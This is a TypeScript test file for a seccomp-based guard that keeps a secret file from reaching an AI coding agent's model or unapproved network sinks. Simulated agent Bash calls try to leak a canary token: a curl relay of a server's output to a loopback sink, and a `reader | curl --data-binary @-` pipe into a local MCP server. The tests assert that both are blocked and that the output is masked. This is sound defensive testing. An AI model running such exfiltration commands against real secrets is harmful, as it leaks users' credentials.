/**
 * socket-flow — plan 13 §9 R1 under the REAL guard: a connection to a secret
 * holder's listener made after the holder was tainted carries the taint to
 * the client, at the network exit and at the model exit.
 *
 *   the real mandu-net-guard (seccomp user notification, no root) around an
 *   "agent" process (a copy of node, the launch's `agentExe`) that runs its
 *   Bash calls as Codex does (`bash -c <command>`), in `secrets`, against a
 *   real ArbiterServer loaded with a policy.yaml (`x.txt`: no-model, reader
 *   `mdu-holder`, a reader the test builds and pins by path and hash, bound nowhere; `cat`
 *   itself admits nothing since plan 13 D8, 2026-10-03). Call 1 starts a dev server in the background
 *   (python3, fed x.txt through the pipe from the reader, so a holder by plan 13
 *   D2; before plan 13 §8 decision (b), 2026-10-02, `python3` was the listed
 *   reader and opened the file itself, which an interpreter running an
 *   agent-writable script no longer may) that answers each HTTP request with
 *   the file's hex; it outlives the call (a holder outside every later
 *   call's tree). Then:
 *
 *   - call 2: `curl` of the server prints the hex. Its result goes through
 *     the AnthropicProxy in its production wiring. Before the fix the call's
 *     tree (bash, curl) held nothing and the hex reached the model raw; now
 *     the guard records curl as flowing from the server (`recordProcessFlow`)
 *     and the call's fold masks it;
 *   - call 3: `x=$(curl …the server…); curl --data-binary "$x" <sink>`, the
 *     sink an HTTP listener on 127.0.0.3 the test owns. Before the fix the
 *     second curl sent the hex; now the first curl is a holder, the shell
 *     reading its output too (plan 13 D2), and the second curl's connect is
 *     refused;
 *   - call 4: `echo clean-r1`, the control (raw), and a curl of an untainted
 *     server on another port, whose result also stays raw (utility).
 *
 * The oracle: no form of the file reaches the model or the sink. SKIPs only
 * where the guard is not built, curl or python3 is missing, or the kernel
 * lacks seccomp user notification.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import http from "node:http";
import net from "node:net";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

import { ArbiterServer } from "../../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../../arbiter/ipc/client.js";
import { AnthropicProxy } from "../../../interceptors/anthropic-proxy/src/proxy.js";
import { ArbiterClientAdapter } from "../../../interceptors/anthropic-proxy/src/arbiter-client.js";
import { MockUpstream, buildTextSse } from "../../../interceptors/anthropic-proxy/test/helpers/mock-upstream.js";
import { agentNodeCopy, pickGuard } from "../../lib/native-guard.js";
import { holderReader, holderSkip } from "../../lib/holder-reader.js";
import { stateAxes } from "../../lib/axes.js";

stateAxes("secrets"); // confidentiality ON, integrity OFF: the axis under test

const HERE = dirname(fileURLToPath(import.meta.url));
const GUARD = pickGuard(resolve(HERE, "..", "..", "..", "interceptors", "target"));
const has = (bin: string): boolean => spawnSync("sh", ["-c", `command -v ${bin}`]).status === 0;
const skip = process.platform !== "linux" ? "Linux only"
  : !GUARD.path ? "mandu-net-guard is not built (scripts/build-native.sh)"
  : !has("curl") ? "curl not installed"
  : !has("python3") ? "python3 not installed"
  : holderSkip() !== false ? holderSkip()
  : false;

const CANARY = `X_TXT_R1_CANARY_${process.pid}`;
const FILE_HEX = Buffer.from(`token=${CANARY}\n`).toString("hex");

/** The dev server: reads its file from standard input (`@stdin`: the pipe
 *  from the pinned reader), marks `ready`, answers `n` requests with
 *  the file's hex (or LIVE when given no file). */
const SERVER = `import socket, sys
path, port, ready, n = sys.argv[1], int(sys.argv[2]), sys.argv[3], int(sys.argv[4])
body = "LIVE-R1" if path == "-" else (sys.stdin.read() if path == "@stdin" else open(path).read()).encode().hex()
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", port)); s.listen(8); s.settimeout(60)
open(ready, "w").write("r")
for _ in range(n):
    try:
        c, _ = s.accept()
    except Exception:
        break
    try:
        c.recv(4096)
        c.sendall(("HTTP/1.1 200 OK\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n%s" % (len(body), body)).encode())
    except Exception:
        pass
    c.close()
`;

/** The agent: each Bash call as Codex runs it, in order; what each returned. */
const AGENT = `import { spawnSync } from "node:child_process";
const cfg = JSON.parse(process.argv[2]);
const out = {};
for (const [k, cmd] of Object.entries(cfg.bash)) {
  const r = spawnSync("bash", ["-c", cmd], { encoding: "utf8", cwd: cfg.cwd, timeout: 60000 });
  out[k] = (r.stdout ?? "") + (r.stderr ?? "");
}
process.stdout.write("AGENT_OUT " + JSON.stringify(out) + "\\n");
`;

function runGuarded(argv: string[], env: NodeJS.ProcessEnv): Promise<{ stdout: string; stderr: string; status: number | null }> {
  return new Promise((ok) => {
    const child = spawn(GUARD.path!, ["--allow", "127.0.0.0/8:*", "--", ...argv], { env, stdio: ["ignore", "pipe", "pipe"] });
    let stdout = "", stderr = "";
    child.stdout.on("data", (c) => (stdout += String(c)));
    child.stderr.on("data", (c) => (stderr += String(c)));
    const timer = setTimeout(() => child.kill("SIGKILL"), 180_000);
    child.on("close", (status) => { clearTimeout(timer); ok({ stdout, stderr, status }); });
  });
}

function post(port: number, body: unknown, session: string): Promise<number> {
  return new Promise((ok, fail) => {
    const req = http.request({ host: "127.0.0.1", port, method: "POST", path: "/v1/messages", headers: { "content-type": "application/json", "x-mandu-session-id": session } },
      (res) => { res.resume(); res.on("end", () => ok(res.statusCode ?? 0)); });
    req.on("error", fail);
    req.end(JSON.stringify(body));
  });
}

function freePort(host: string): Promise<number> {
  return new Promise((ok, fail) => {
    const s = net.createServer();
    s.on("error", fail);
    s.listen(0, host, () => { const p = (s.address() as net.AddressInfo).port; s.close(() => ok(p)); });
  });
}

const cannotAttach = (stderr: string): boolean => /seccomp|SECCOMP|user notification|ENOSYS|not supported/i.test(stderr);

test("the guard under test is built from the current sources", { skip: process.platform !== "linux" || !GUARD.path }, () => {
  assert.equal(GUARD.stale, null, GUARD.stale ?? "");
});

test("R1 LIVE: a client of a holder's listener, connected after the taint, is a holder: its output reaches the model masked and its send to an unbound host is refused (secrets axes)", { skip, timeout: 300_000 }, async (t) => {
  const tmp = realpathSync(mkdtempSync(join(tmpdir(), "mandu-r1-")));
  const work = join(tmp, "work");
  mkdirSync(work, { recursive: true });
  const secret = join(work, "x.txt");
  writeFileSync(secret, `token=${CANARY}\n`);
  writeFileSync(join(tmp, "srv.py"), SERVER);
  const policy = join(tmp, "policy.yaml");
  // plan 13 D8, printers admit nothing (2026-10-03): the reader is a program
  // the test builds and pins by path and hash (tests/lib/holder-reader.c),
  // on the agent's PATH as mdu-holder; `cat` itself admits nothing.
  const holder = holderReader(tmp)!;
  writeFileSync(policy, `version: 1\npaths:\n  - path: ${secret}\n    level: no-model\n    readers: [${holder.yaml}]\n`);
  const logs: string[] = [];
  const server = new ArbiterServer({ socketPath: join(tmp, "arbiter.sock"), humanSocketPath: join(tmp, "human", "h.sock"), dbPath: join(tmp, "symbols.sqlite"), eventDir: join(tmp, "events"), policyPath: policy, log: (m: string) => { logs.push(m); }, confidentiality: true, integrity: false });
  await server.listen();
  const client = new ArbiterClient(join(tmp, "arbiter.sock"));
  await client.connect();
  const human = new ArbiterClient(join(tmp, "human", "h.sock"));
  await human.connect();
  const session = `r1-${process.pid}`;
  // The sink, bound nowhere: what reaches it is the leak.
  const received: string[] = [];
  const sink = http.createServer((req, res) => { let b = ""; req.on("data", (d) => (b += d)); req.on("end", () => { received.push(b); res.end("ok"); }); });
  await new Promise<void>((ok) => sink.listen(0, "127.0.0.3", () => ok()));
  const sinkPort = (sink.address() as net.AddressInfo).port;
  const upstream = new MockUpstream({ sse: buildTextSse("ok", { deltas: 1 }) });
  const proxy = new AnthropicProxy({ arbiter: new ArbiterClientAdapter(client, human), upstream: upstream.fetcher, sessionKey: session, log: () => {} });
  const port = await proxy.listen(0);
  try {
    const reg = await client.registerSecret({ path: secret, home: tmp });
    assert.match(String(reg.symbol), /^\$MDU:/, JSON.stringify(reg));
    const twin = join(tmp, "x.twin");
    writeFileSync(twin, typeof (reg as { twin?: unknown }).twin === "string" ? String((reg as { twin?: string }).twin) : `${reg.symbol}\n`);
    const agentNode = agentNodeCopy(tmp);
    const secretPolicy = join(tmp, "secret-policy.json");
    writeFileSync(secretPolicy, JSON.stringify({ unixDeny: [join(tmp, "human")], agentExe: agentNode, ask: "never", session, secrets: [{ path: secret, twin, level: "no-model" }] }));
    const [held, live] = [await freePort("127.0.0.1"), await freePort("127.0.0.1")];
    const srv = join(tmp, "srv.py");
    const wait = (f: string): string => `for i in $(seq 1 100); do [ -e ${f} ] && break; sleep 0.1; done`;
    const cmds = {
      // The clean server in a call of its own, before the holder's: since
      // 2026-10-03 the shell that starts a holder is one itself (it learns
      // the holder's exit status, plan 13 §4.9), and a server it started
      // beside the holder would be swept with it.
      startLive: `nohup python3 ${srv} - ${live} ${tmp}/ready-live 1 >/dev/null 2>&1 & ${wait(`${tmp}/ready-live`)}; echo started`,
      start: `mdu-holder ./x.txt | nohup python3 ${srv} @stdin ${held} ${tmp}/ready 2 >/dev/null 2>&1 & ${wait(`${tmp}/ready`)}; echo started`,
      fetch: `curl -s -m 10 http://127.0.0.1:${held}/; echo`,
      relay: `x=$(curl -s -m 10 http://127.0.0.1:${held}/); curl -s -m 5 -o /dev/null -w 'sent=%{http_code}' --data-binary "$x" http://127.0.0.3:${sinkPort}/; echo " rc=$?"`,
      liveFetch: `curl -s -m 10 http://127.0.0.1:${live}/; echo`,
      clean: "echo clean-r1",
    };
    const agentJs = join(tmp, "agent.mjs");
    writeFileSync(agentJs, AGENT);
    // The proxy's record of each call's command, made when it relayed the
    // call (plan 13 D9 follow-up: a call binds by that record).
    const ids: Record<string, string> = { fetch: "toolu_r1_fetch", clean: "toolu_r1_clean", liveFetch: "toolu_r1_live" };
    for (const [k, id] of Object.entries(ids)) await human.recordCallCommand({ callId: id, command: cmds[k as keyof typeof cmds], sessionKey: session });
    const run = await runGuarded([agentNode, agentJs, JSON.stringify({ bash: cmds, cwd: work })], { ...process.env, HOME: tmp, PATH: `${join(tmp, "bin")}:${process.env.PATH ?? "/usr/bin:/bin"}`, MANDU_ARBITER_SOCK: join(tmp, "arbiter.sock"), MANDU_NET_GUARD_SECRETS: secretPolicy });
    const line = (run.stdout ?? "").split("\n").find((l) => l.startsWith("AGENT_OUT "));
    if (!line && cannotAttach(run.stderr ?? "")) {
      t.skip(`the guard cannot attach here: ${run.stderr.slice(0, 300)}`);
      return;
    }
    assert.ok(line, `the agent ran under the guard (status ${run.status}): ${run.stdout}\n${run.stderr}`);
    const got = JSON.parse(line!.slice("AGENT_OUT ".length)) as Record<string, string>;
    const opens = (): string => logs.filter((l) => /decideSecretOpen|recordProcessFlow/.test(l)).join("\n");
    // Preconditions: the server read the real file, and curl received its hex.
    assert.equal(got["startLive"]!.trim(), "started", JSON.stringify(got));
    assert.equal(got["start"]!.trim(), "started", JSON.stringify(got));
    assert.equal(got["fetch"]!.trim(), FILE_HEX, `curl received the holder's bytes (so a leak is possible): ${got["fetch"]}\n${opens()}`);
    assert.equal(got["liveFetch"]!.trim(), "LIVE-R1", "control: the untainted server answers");

    const tools = [{ name: "Bash", input_schema: { type: "object" } }];
    const send = async (command: string, result: string, id: string): Promise<string> => {
      const n = upstream.requests.length;
      assert.equal(await post(port, { model: "claude-sonnet-4-5", stream: true, max_tokens: 512, tools, messages: [
        { role: "user", content: "go" },
        { role: "assistant", content: [{ type: "tool_use", id, name: "Bash", input: { command } }] },
        { role: "user", content: [{ type: "tool_result", tool_use_id: id, content: result }] },
      ] }, session), 200);
      const b = upstream.requests[n]!.json() as { messages: Array<{ content: Array<{ content: unknown }> }> };
      return JSON.stringify(b.messages[2]!.content[0]!.content);
    };
    const fetched = await send(cmds.fetch, got["fetch"]!, "toolu_r1_fetch");
    assert.ok(!fetched.includes(FILE_HEX.slice(0, 24)), `CONFIDENTIALITY VIOLATION: the client's output reached the model raw: ${fetched}`);
    assert.match(fetched, /\[mandu:secret\] masked/, fetched);
    const clean = await send(cmds.clean, got["clean"]!, "toolu_r1_clean");
    assert.ok(clean.includes("clean-r1"), `control: a clean call stays raw: ${clean}`);
    const liveSeen = await send(cmds.liveFetch, got["liveFetch"]!, "toolu_r1_live");
    assert.ok(liveSeen.includes("LIVE-R1"), `utility: a client of an untainted server stays raw: ${liveSeen}`);

    // The network exit: the relay's second curl was refused.
    assert.ok(!/sent=200/.test(got["relay"]!), `the relay reached the sink: ${got["relay"]}`);
    await new Promise((ok) => setTimeout(ok, 300));
    // THE ORACLE.
    assert.ok(!received.join("\n").includes(FILE_HEX.slice(0, 24)) && !received.join("\n").includes(CANARY), "THE LEAK: the unbound sink received the file");
    const wire = upstream.requests.map((r) => r.bodyText).join("\n");
    assert.ok(!wire.includes(CANARY) && !wire.includes(FILE_HEX.slice(0, 24)), "the file's bytes never reached the model");
  } finally {
    await proxy.close();
    sink.close();
    client.close();
    human.close();
    await server.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});

/** The agent for the HTTP MCP case: one Bash call as Codex runs it, then the
 *  agent's own MCP client (this process) reads the server's store, as
 *  Claude Code's HTTP MCP client would for an `mcp__store__get` call. */
const AGENT_MCP = `import { spawnSync } from "node:child_process";
const cfg = JSON.parse(process.argv[2]);
const r = spawnSync("bash", ["-c", cfg.bash], { encoding: "utf8", cwd: cfg.cwd, timeout: 60000 });
let store = "";
try { store = await (await fetch(cfg.store)).text(); } catch (e) { store = "<fetch failed: " + e.message + ">"; }
process.stdout.write("AGENT_OUT " + JSON.stringify({ bash: (r.stdout ?? "") + (r.stderr ?? ""), store }) + "\\n");
`;

// Item 5(a) of the P0 wave (verified 2026-10-02, closed by plan 13 D2 and
// R1): Claude Code's `psql … | curl localhost:<port>` into a local HTTP MCP
// server the user runs, then the model reads it back through that server's
// own tool (the agent's MCP client). The reader here is the pinned `mdu-holder` (a listed
// reader; psql is one the same way). `curl` reads the reader's pipe, so it is
// a holder (D2), and a holder may connect on loopback only to Mandu's network
// proxy: the connect is refused, the server stores nothing, and the store the
// agent reads back holds no byte of the file.
test("5(a) LIVE: `reader | curl` into a local HTTP MCP server sends nothing; the server's store read back through the agent's MCP client holds no byte of the file (secrets axes)", { skip, timeout: 300_000 }, async (t) => {
  const tmp = realpathSync(mkdtempSync(join(tmpdir(), "mandu-mcp-sink-")));
  const work = join(tmp, "work");
  mkdirSync(work, { recursive: true });
  const secret = join(work, "x.txt");
  writeFileSync(secret, `token=${CANARY}\n`);
  const policy = join(tmp, "policy.yaml");
  // plan 13 D8, printers admit nothing (2026-10-03): the reader is a program
  // the test builds and pins by path and hash (tests/lib/holder-reader.c),
  // on the agent's PATH as mdu-holder; `cat` itself admits nothing.
  const holder = holderReader(tmp)!;
  writeFileSync(policy, `version: 1\npaths:\n  - path: ${secret}\n    level: no-model\n    readers: [${holder.yaml}]\n`);
  const server = new ArbiterServer({ socketPath: join(tmp, "arbiter.sock"), humanSocketPath: join(tmp, "human", "h.sock"), dbPath: join(tmp, "symbols.sqlite"), eventDir: join(tmp, "events"), policyPath: policy, log: () => {}, confidentiality: true, integrity: false });
  await server.listen();
  const client = new ArbiterClient(join(tmp, "arbiter.sock"));
  await client.connect();
  const human = new ArbiterClient(join(tmp, "human", "h.sock"));
  await human.connect();
  const session = `mcp-sink-${process.pid}`;
  // The HTTP MCP server the user runs (outside the agent's tree): a POST is
  // stored, a GET answers what it holds.
  const stored: string[] = [];
  const mcp = http.createServer((req, res) => {
    let b = "";
    req.on("data", (d) => (b += d));
    req.on("end", () => { if (req.method === "POST") stored.push(b); res.end(req.method === "POST" ? "stored" : `store:${stored.join("|")}`); });
  });
  await new Promise<void>((ok) => mcp.listen(0, "127.0.0.1", () => ok()));
  const mcpPort = (mcp.address() as net.AddressInfo).port;
  const upstream = new MockUpstream({ sse: buildTextSse("ok", { deltas: 1 }) });
  const proxy = new AnthropicProxy({ arbiter: new ArbiterClientAdapter(client, human), upstream: upstream.fetcher, sessionKey: session, log: () => {} });
  const port = await proxy.listen(0);
  try {
    const reg = await client.registerSecret({ path: secret, home: tmp });
    assert.match(String(reg.symbol), /^\$MDU:/, JSON.stringify(reg));
    const twin = join(tmp, "x.twin");
    writeFileSync(twin, typeof (reg as { twin?: unknown }).twin === "string" ? String((reg as { twin?: string }).twin) : `${reg.symbol}\n`);
    const agentNode = agentNodeCopy(tmp);
    const secretPolicy = join(tmp, "secret-policy.json");
    writeFileSync(secretPolicy, JSON.stringify({ unixDeny: [join(tmp, "human")], agentExe: agentNode, ask: "never", session, secrets: [{ path: secret, twin, level: "no-model" }] }));
    const agentJs = join(tmp, "agent-mcp.mjs");
    writeFileSync(agentJs, AGENT_MCP);
    const bash = `mdu-holder ./x.txt | curl -s -m 5 -o /dev/null -w 'sent=%{http_code}' --data-binary @- http://127.0.0.1:${mcpPort}/store; echo " rc=$?"`;
    const run = await runGuarded([agentNode, agentJs, JSON.stringify({ bash, cwd: work, store: `http://127.0.0.1:${mcpPort}/store` })], { ...process.env, HOME: tmp, PATH: `${join(tmp, "bin")}:${process.env.PATH ?? "/usr/bin:/bin"}`, MANDU_ARBITER_SOCK: join(tmp, "arbiter.sock"), MANDU_NET_GUARD_SECRETS: secretPolicy });
    const line = (run.stdout ?? "").split("\n").find((l) => l.startsWith("AGENT_OUT "));
    if (!line && cannotAttach(run.stderr ?? "")) {
      t.skip(`the guard cannot attach here: ${run.stderr.slice(0, 300)}`);
      return;
    }
    assert.ok(line, `the agent ran under the guard (status ${run.status}): ${run.stdout}\n${run.stderr}`);
    const got = JSON.parse(line!.slice("AGENT_OUT ".length)) as { bash: string; store: string };
    // The network exit: curl, a holder through the pipe, was refused.
    assert.ok(!/sent=200/.test(got.bash), `the pipe's curl reached the MCP server: ${got.bash}`);
    assert.ok(!stored.join("|").includes(CANARY), "THE LEAK: the MCP server stored the file");
    // The agent's own MCP client read the store back; through the proxy as the tool's result.
    assert.ok(got.store.startsWith("store:"), `the agent's MCP client reached the server: ${got.store}`);
    assert.equal(await post(port, { model: "claude-sonnet-4-5", stream: true, max_tokens: 512, tools: [{ name: "mcp__store__get", input_schema: { type: "object" } }], messages: [
      { role: "user", content: "go" },
      { role: "assistant", content: [{ type: "tool_use", id: "toolu_mcp_get", name: "mcp__store__get", input: { key: "store" } }] },
      { role: "user", content: [{ type: "tool_result", tool_use_id: "toolu_mcp_get", content: got.store }] },
    ] }, session), 200);
    const wire = upstream.requests.map((r) => r.bodyText).join("\n");
    assert.ok(!wire.includes(CANARY) && !wire.includes(FILE_HEX.slice(0, 24)), "THE ORACLE: the file never reached the model");
  } finally {
    await proxy.close();
    mcp.close();
    client.close();
    human.close();
    await server.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
